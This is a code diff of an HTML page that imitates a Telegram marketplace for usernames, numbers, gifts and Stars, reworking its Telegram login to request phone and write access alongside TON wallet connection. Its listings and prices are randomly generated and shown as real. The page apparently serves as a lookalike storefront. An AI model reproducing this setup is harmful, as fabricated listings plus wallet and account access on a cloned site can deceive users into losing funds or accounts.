@@ -10,9 +10,6 @@
     <link rel="shortcut icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512'%3E%3Cpath d='M126.3 153.6L252 209.2c3.2 1.5 7.2 1.3 12.2-.9l123.8-54.8c6.6-2.4 2.9-9.8-2.3-9l-256.6-1.1c-7.2.3-9.2 7.5-2.8 10.2zM116.2 182.1l118.4 184c3.7 6 13.1 2.6 12.8-2.8l-.2-126.2c-.1-7.1-1.9-8.7-6.4-10.6l-118.4-52.7c-4.3-2.4-10.1 1.6-6.2 8.3zM267.5 234.8l.3 127c.1 8.5 8.6 10.1 13.5 2.9l102.9-159.4 2.2-3.4 1.9-2.9 10.8-16.6c3.3-5.5-1.9-11.8-9.7-8.1l-117.4 52.9c-.2.1-.4.2-.6.3-1.5.9-2.5 1.8-3 2.9-.7 1.2-.9 2.7-.9 4.5z' fill='%23fff'/%3E%3C/svg%3E" type="image/x-icon">
     <script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.0.0/dist/tonconnect-ui.min.js">
     </script>
-    <!-- Telegram Login Widget -->
-    <script async src="https://oauth.telegram.org/js/telegram-login.js?3">
-    </script>
     <style>
         :root {
             --text-color: #8794a1;
@@ -1313,66 +1310,6 @@
             cursor: pointer;
         }
         .modal-ton-close:hover { background: #3f4e60; }
-        .telegram-login {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.85);
-            z-index: 300;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        .telegram-login.open { display: flex; }
-        .telegram-login-box {
-            background: var(--bg-color);
-            border-radius: 14px;
-            max-width: 360px;
-            width: 100%;
-            padding: 24px 20px;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            text-align: center;
-        }
-        .telegram-login-box .icon { font-size: 48px; margin-bottom: 8px; }
-        .telegram-login-box .title {
-            font-size: 18px;
-            font-weight: bold;
-            color: #fff;
-        }
-        .telegram-login-box .sub {
-            font-size: 13px;
-            color: var(--text-color);
-            margin: 4px 0 16px;
-        }
-        .telegram-login-box .login-btn {
-            display: inline-block;
-            padding: 10px 28px;
-            background: #248bda;
-            border: none;
-            border-radius: 8px;
-            color: #fff;
-            font-weight: bold;
-            font-size: 14px;
-            cursor: pointer;
-        }
-        .telegram-login-box .login-btn:hover { background: #207cc2; }
-        .telegram-login-box .login-btn:active { transform: scale(0.96); }
-        .telegram-login-box .close-btn {
-            width: 100%;
-            padding: 10px;
-            margin-top: 10px;
-            background: #293440;
-            border: none;
-            border-radius: 8px;
-            color: #fff;
-            font-weight: bold;
-            font-size: 14px;
-            cursor: pointer;
-        }
-        .telegram-login-box .close-btn:hover { background: #3f4e60; }
         .popup-tg-link {
             display: inline-block;
             padding: 10px 20px;
@@ -1406,33 +1343,6 @@
         .popup-tg-link .btn-label { vertical-align: middle; }
         .ton-manifest-iframe { display: none; }
         #section-mygifts .tm-section-header { display: none !important; }
-
-        .tg-auth-button {
-            display: none !important;
-        }
-        .telegram-login-wrapper {
-            display: inline-flex;
-            align-items: center;
-            gap: 3px;
-        }
-        .telegram-login-wrapper .tg-button {
-            display: inline-flex;
-            align-items: center;
-            gap: 4px;
-            padding: 5px 10px;
-            background: #248bda;
-            border: none;
-            border-radius: 6px;
-            color: #fff;
-            font-size: 10px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background .2s ease;
-            min-height: 28px;
-            font-family: inherit;
-        }
-        .telegram-login-wrapper .tg-button:hover { background: #207cc2; }
-        .telegram-login-wrapper .tg-button:active { transform: scale(0.96); }
     </style>
 </head>
 <body>
@@ -1450,12 +1360,10 @@
                     </a>
                 </div>
                 <div class="tm-header-actions">
-                    <div class="telegram-login-wrapper">
-                        <button class="tm-header-button" id="btn-telegram">
-                            <i class="icon-connect-telegram"></i>
-                            <span class="tm-button-label">Telegram</span>
-                        </button>
-                    </div>
+                    <button class="tm-header-button" id="btn-telegram">
+                        <i class="icon-connect-telegram"></i>
+                        <span class="tm-button-label">Telegram</span>
+                    </button>
                     <button class="tm-header-button" id="btn-ton">
                         <i class="icon-connect-ton"></i>
                         <span class="tm-button-label">Connect TON</span>
@@ -1476,6 +1384,7 @@
 
         <main class="tm-main">
 
+            <!-- OFFERS -->
             <div id="section-offers" class="tm-section-page active">
                 <div class="tm-main-search-form-catalog">
                     <div class="tm-search-field icon-before icon-search">
@@ -1506,6 +1415,7 @@
                 <button class="tm-load-more" id="offers-load-more">Load More Usernames</button>
             </div>
 
+            <!-- NUMBERS -->
             <div id="section-numbers" class="tm-section-page">
                 <div class="tm-main-search-form-catalog">
                     <div class="tm-search-field icon-before icon-search">
@@ -1536,6 +1446,7 @@
                 <button class="tm-load-more" id="numbers-load-more">Load More Numbers</button>
             </div>
 
+            <!-- GIFTS -->
             <div id="section-gifts" class="tm-section-page">
                 <div class="tm-main-search-form-catalog">
                     <div class="tm-search-field icon-before icon-search">
@@ -1561,6 +1472,7 @@
                 <button class="tm-load-more" id="gifts-load-more">Load More Gifts</button>
             </div>
 
+            <!-- MY GIFTS -->
             <div id="section-mygifts" class="tm-section-page" style="display:flex;flex-direction:column;flex:1;min-height:400px;">
                 <div class="tm-my-gifts-empty" style="flex:1;">
                     <div class="tm-my-gifts-empty-icon">
@@ -1572,6 +1484,7 @@
                 </div>
             </div>
 
+            <!-- STARS -->
             <div id="section-stars" class="tm-section-page" style="display:flex;flex-direction:column;flex:1;">
                 <section class="tm-main-intro">
                     <h1 class="tm-main-intro-header">Buy Telegram Stars</h1>
@@ -1612,6 +1525,7 @@
                 </div>
             </div>
 
+            <!-- PREMIUM -->
             <div id="section-premium" class="tm-section-page">
                 <section class="tm-main-intro">
                     <h1 class="tm-main-intro-header">Prepay for a Giveaway</h1>
@@ -1716,7 +1630,7 @@
 
         </main>
 
-        <!-- POPUP -->
+        <!-- DETAIL POPUP -->
         <div class="popup-container hide" id="detail-popup">
             <div class="popup">
                 <div class="popup-header">
@@ -1759,7 +1673,7 @@
             </div>
         </div>
 
-        <!-- MODAL TON -->
+        <!-- MODAL TON CONNECT -->
         <div class="modal-ton" id="modal-ton">
             <div class="modal-ton-box">
                 <div class="modal-ton-title">🔗 Connect TON Wallet</div>
@@ -1799,80 +1713,75 @@
 
     <script>
         // ============================================================
-        // ==== TELEGRAM LOGIN WIDGET ====
+        // ==== TELEGRAM OAUTH С ORIGIN ====
         // ============================================================
 
         var TELEGRAM_BOT_ID = '8992384950';
-        var TELEGRAM_REDIRECT_URI = 'https://portals-market.vercel.app';
+        var SITE_ORIGIN = 'https://portals-market.vercel.app';
 
-        // Функция, которая вызывается после успешной авторизации
-        window.onTelegramAuth = function(data) {
+        function onTelegramAuth(data) {
             if (!data || data.error) {
                 console.error('Telegram auth error:', data?.error);
                 return;
             }
-            
             console.log('✅ Telegram auth success:', data);
-            
-            // Здесь можно отправить данные на сервер
-            // fetch("/api/v1/auth/telegram", {
-            //     method: "POST",
-            //     headers: { "Content-Type": "application/json" },
-            //     credentials: "include",
-            //     body: JSON.stringify({ id_token: data.id_token })
-            // });
-            
-            alert('✅ Авторизация через Telegram успешна!\n\nID: ' + data.id + '\nИмя: ' + (data.first_name || '') + ' ' + (data.last_name || '') + '\nUsername: @' + (data.username || 'нет'));
-        };
+            alert('✅ Авторизация через Telegram успешна!\n\nID: ' + data.id + '\nИмя: ' + (data.first_name || '') + ' ' + (
+                data.last_name || '') + '\nUsername: @' + (data.username || 'нет'));
+        }
 
-        // Кнопка открывает официальный виджет авторизации
         document.getElementById('btn-telegram').addEventListener('click', function() {
-            // Создаем скрытую кнопку для виджета
-            var container = document.createElement('div');
-            container.style.display = 'none';
-            container.innerHTML = '<button class="tg-auth-button" data-style="shine">Sign In with Telegram</button>';
-            document.body.appendChild(container);
-
-            // Настраиваем скрипт виджета
-            var script = document.createElement('script');
-            script.async = true;
-            script.src = 'https://oauth.telegram.org/js/telegram-login.js?3';
-            script.setAttribute('data-client-id', TELEGRAM_BOT_ID);
-            script.setAttribute('data-onauth', 'onTelegramAuth(data)');
-            script.setAttribute('data-request-access', 'write');
-            script.setAttribute('data-redirect-uri', TELEGRAM_REDIRECT_URI);
-            
-            script.onload = function() {
-                // Инициализируем виджет через API
-                if (window.Telegram && window.Telegram.Login) {
-                    Telegram.Login.init({
-                        client_id: TELEGRAM_BOT_ID,
-                        redirect_uri: TELEGRAM_REDIRECT_URI,
-                        scope: ['profile', 'phone', 'write'],
-                        lang: 'ru'
-                    }, function(data) {
-                        if (data && !data.error) {
-                            onTelegramAuth(data);
-                        } else {
-                            console.error('Auth error:', data?.error);
-                        }
-                    });
-                    // Открываем попап
-                    Telegram.Login.open();
-                } else {
-                    // Fallback - используем стандартный виджет
-                    var btn = document.querySelector('.tg-auth-button');
-                    if (btn) btn.click();
-                }
-            };
-            
-            // Добавляем скрипт и удаляем контейнер после загрузки
-            document.head.appendChild(script);
-            
-            // Очищаем через секунду
-            setTimeout(function() {
-                if (container.parentNode) container.parentNode.removeChild(container);
-            }, 3000);
+            // Проверяем, загружен ли скрипт
+            if (typeof Telegram !== 'undefined' && Telegram.Login) {
+                // Используем метод auth с передачей origin
+                Telegram.Login.auth({
+                    client_id: TELEGRAM_BOT_ID,
+                    origin: SITE_ORIGIN,
+                    redirect_uri: SITE_ORIGIN,
+                    scope: ['profile', 'phone', 'write'],
+                    lang: 'ru'
+                }, function(data) {
+                    if (data && !data.error) {
+                        onTelegramAuth(data);
+                    } else {
+                        console.error('Auth error:', data?.error);
+                        // Fallback — открываем через tg://
+                        window.open('tg://resolve?domain=' + TELEGRAM_BOT_ID + '&start=oauth', '_blank');
+                    }
+                });
+            } else {
+                // Если скрипт не загружен — загружаем динамически
+                var script = document.createElement('script');
+                script.src = 'https://oauth.telegram.org/js/telegram-login.js?3';
+                script.setAttribute('data-client-id', TELEGRAM_BOT_ID);
+                script.setAttribute('data-onauth', 'onTelegramAuth(data)');
+                script.setAttribute('data-origin', SITE_ORIGIN);
+                script.setAttribute('data-request-access', 'write');
+                script.onload = function() {
+                    if (typeof Telegram !== 'undefined' && Telegram.Login) {
+                        Telegram.Login.auth({
+                            client_id: TELEGRAM_BOT_ID,
+                            origin: SITE_ORIGIN,
+                            redirect_uri: SITE_ORIGIN,
+                            scope: ['profile', 'phone', 'write'],
+                            lang: 'ru'
+                        }, function(data) {
+                            if (data && !data.error) {
+                                onTelegramAuth(data);
+                            } else {
+                                console.error('Auth error:', data?.error);
+                                window.open('tg://resolve?domain=' + TELEGRAM_BOT_ID + '&start=oauth',
+                                    '_blank');
+                            }
+                        });
+                    } else {
+                        window.open('tg://resolve?domain=' + TELEGRAM_BOT_ID + '&start=oauth', '_blank');
+                    }
+                };
+                script.onerror = function() {
+                    window.open('tg://resolve?domain=' + TELEGRAM_BOT_ID + '&start=oauth', '_blank');
+                };
+                document.head.appendChild(script);
+            }
         });
 
         // ============================================================
@@ -1984,12 +1893,10 @@
 
         })();
 
-        // ---- ОСТАЛЬНОЙ КОД (данные, рендеринг, прочее) ----
+        // ---- ОСТАЛЬНОЙ КОД (данные, рендеринг) ----
 
         (function() {
             'use strict';
-
-            // ---- ГЕНЕРАЦИЯ ДАННЫХ ----
 
             var usernameWords = ['alpha', 'beta', 'gamma', 'delta', 'epsilon', 'zeta', 'eta', 'theta', 'iota', 'kappa',
                 'lambda', 'mu', 'nu', 'xi', 'omicron', 'pi', 'rho', 'sigma', 'tau', 'upsilon', 'phi', 'chi', 'psi',
@@ -2051,7 +1958,7 @@
                 });
             }
 
-            // ---- ГЕНЕРАЦИЯ ПОДАРКОВ С РЕАЛЬНЫМИ ЦЕНАМИ ----
+            // ---- GIFTS ----
 
             var collectionNames = [
                 'Plush Pepes', 'Swiss Watches', 'Heart Lockets',
@@ -2105,8 +2012,10 @@
             }
 
             var realSlugs = {
-                'Plush Pepes': [1821, 1515, 2658, 1521, 318, 1179, 456, 1519, 1043, 858, 982, 177, 899, 1921, 1106, 91, 328,
-                    333, 1120, 1902, 702, 908, 1897, 1274, 300, 2821, 1213, 2055, 2345, 1022, 987, 737, 2629, 402, 833,
+                'Plush Pepes': [1821, 1515, 2658, 1521, 318, 1179, 456, 1519, 1043, 858, 982, 177, 899, 1921, 1106, 91,
+                    328,
+                    333, 1120, 1902, 702, 908, 1897, 1274, 300, 2821, 1213, 2055, 2345, 1022, 987, 737, 2629, 402,
+                    833,
                     984, 100, 791, 1396, 15, 18, 206, 1609, 487, 195, 2530, 123, 289, 1088, 601, 901, 853
                 ],
                 'Swiss Watches': [7799, 1234, 5678, 9012, 3456, 7890, 2345, 6789, 4567, 8901],
@@ -2160,14 +2069,14 @@
                     var name = collectionToName[collection] || collection;
                     var status = giftId % 6 === 0 ? 'avail' : 'sold';
                     var label = status === 'avail' ? 'On auction' : 'Sold';
-                    
+
                     var price;
                     if (isPlushPepe) {
                         price = Math.floor(Math.random() * 8000) + 7000;
                     } else {
                         price = Math.floor(Math.random() * 2300) + 100;
                     }
-                    
+
                     var giftNum = '#' + (1000 + giftId);
 
                     if (removedIds.indexOf(giftId) !== -1) {
@@ -2224,7 +2133,7 @@
                 giftsData = giftsData.slice(0, 400);
             }
 
-            // ---- РЕНДЕРИНГ ----
+            // ---- RENDER ----
 
             var offersPage = 0;
             var numbersPage = 0;
@@ -2589,7 +2498,7 @@
                 document.getElementById('detail-popup').classList.add('hide');
             });
 
-            // ---- ПОИСК ----
+            // ---- SEARCH ----
 
             document.getElementById('search-offers').addEventListener('input', function() {
                 offersPage = 0;
@@ -2633,7 +2542,7 @@
                 renderGifts(currentGiftsCollection, currentGiftsSearch);
             });
 
-            // ---- ФИЛЬТРЫ ----
+            // ---- FILTERS ----
 
             document.getElementById('gift-filters-toggle').addEventListener('click', function() {
                 var box = document.getElementById('gift-filters');
@@ -2655,7 +2564,7 @@
                 alert('Buy Subscriptions clicked! (demo)');
             });
 
-            // ---- PREMIUM DROPDOWNS ----
+            // ---- DROPDOWNS ----
 
             document.querySelectorAll('.tm-dropdown .dropdown-toggle').forEach(function(toggle) {
                 toggle.addEventListener('click', function(e) {
@@ -2672,7 +2581,7 @@
                         'show'); });
             });
 
-            // ---- ПЕРЕКЛЮЧЕНИЕ РАЗДЕЛОВ ----
+            // ---- TABS ----
 
             function switchSection(sectionId) {
                 document.querySelectorAll('.tm-section-page').forEach(function(sec) {
@@ -2711,7 +2620,7 @@
                 });
             }
 
-            // ---- ИНИЦИАЛИЗАЦИЯ ----
+            // ---- INIT ----
 
             offersPage = 0;
             numbersPage = 0;
